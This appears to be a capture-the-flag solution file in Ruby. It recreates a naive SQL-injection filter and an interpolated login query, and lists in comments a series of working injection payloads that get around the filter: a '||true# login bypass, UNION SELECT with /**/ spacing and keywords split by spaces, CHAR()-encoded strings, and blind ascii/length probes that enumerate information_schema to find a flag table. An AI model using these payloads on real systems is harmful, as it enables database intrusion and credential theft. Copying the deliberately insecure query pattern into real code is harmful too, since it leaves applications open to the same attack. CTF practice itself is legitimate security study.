def sqli_waf (str)
    str.gsub(/union|select|where|and|or| |=/i, '')
end

def addslashes (str)
    str.gsub(/['"]/,'\\\\\0')
end

# 25
# username/password/uid
# \'||true#
# \'/**/UNI ON/**/SEL ECT/**/1,2,3/**/FROM/**/users# 
# \'/**/UNI ON/**/SEL ECT/**/*/**/FROM/**/(SEL ECT/**/*/**/FROM/**/users/**/JOIN/**/users/**/b)a#
# \'/**/UNI ON/**/SEL ECT/**/1,2,username/**/FROM/**/users/**/whe re/**/length(passwo rd)/**/LIKE/**/25&&ascii(mid(username,1,1))>105#
# \'/**/UNI ON/**/SEL ECT/**/1,2,username/**/FROM/**/users/**/whe re/**/passwo rd/**/LIKE/**/CHAR(70,76,65,71,40,37,41)#
# \'/**/UNI ON/**/SEL ECT/**/1,2,table_name/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&length(table_name)>10/**/LIMIT/**/0,1#

# get column name: i_4m_th3_fl4g
# \'/**/UNI ON/**/SEL ECT/**/1,2,3/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/whe re/**/(SEL ECT/**/*/**/FROM/**/(SEL ECT/**/*/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/as/**/a/**/join/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/as/**/b)as/**/c)#

# admin : FLAG(is_in_another_table)
# table_schema/**/LIKE/**/CHAR(100,98)&&table_name/**/LIKE/**/CHAR(117,115,101,114,115)&&
# \'/**/UNI ON/**/SEL ECT/**/1,2,column_name/**/FROM/**/info rmation_schema.columns/**/whe re/**/column_name/**/LIKE/**/CHAR(102,108,97,103)# ascii(mid(column_name,1,1))

# \'/**/UNI ON/**/SEL ECT/**/1,2,column_name/**/FROM/**/info rmation_schema.columns/**/whe re/**/column_name/**/LIKE/**/CHAR(37,70,76,65,71,123,37)#
# \'/**/UNI ON/**/SEL ECT/**/1,2,table_name/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&table_name/**/LIKE/**/CHAR(37,102,108,97,103)&&length(table_name)>10#

# \'/**/UNI ON/**/SEL ECT/**/1,2,column_name/**/FROM/**/info rmation_schema.columns/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&column_name/**/LIKE/**/CHAR(102,108,97,103,115)#

# \'/**/UNI ON/**/SEL ECT/**/1,2,3/**/FROM/**/users/**/whe re/**/linestring(passwo rd)#
# /**/SEL ECT/**/*/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&length(table_name)>10/**/LIMIT/**/0,1

# \'||length(user())>0# len = 15
# \'||schema()/**/LIKE/**/CHAR(37,70,76,65,71,123,37)#
# %FLAG{% => CHAR(37,70,76,65,71,123,37)
# %FLAG% => CHAR(37,70,76,65,71,37)
# flag => CHAR(102,108,97,103)
input = {'username'=> "", 'password'=> ""}
@params = Hash[input.map { |key, value| [key, sqli_waf(value)] }]

# puts @params
# puts addslashes(@params['username'])
query = "SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'"
puts query